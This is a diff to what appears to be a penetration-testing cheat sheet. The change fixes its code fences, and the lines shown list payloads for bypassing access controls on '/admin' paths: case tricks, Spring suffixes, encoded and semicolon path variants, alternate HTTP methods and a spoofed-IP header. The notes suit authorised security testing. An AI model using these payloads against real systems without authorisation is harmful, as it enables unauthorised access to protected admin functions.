@@ -48,15 +48,15 @@ X-True-IP
 ```
 ## Url Rewrite:
 Miss match in url path e.g. 
-´´´
+```
 /admin vs /adMiN
-´´´
+
 In Spring arbitray field extension might be possible:
-´´´
+
 /admin.anything
-´´´
+```
 Different Combination and Payloads
-´´´
+```
 /admin /deleteUser to /admin/deletuser or /admin/deletuser/
 /%2e/admin	
 /admin/.
@@ -66,9 +66,9 @@ Different Combination and Payloads
 /;./admin/
 /;//admin/
 /admin..;/
-´´´
+```
 ## Different HTTP METHODs
-´´´
+```
 POST
 OPTIONS
 PUT
@@ -77,5 +77,5 @@ GET
 DELETE
 PATCH
 TRACE
-´´´
+```
 
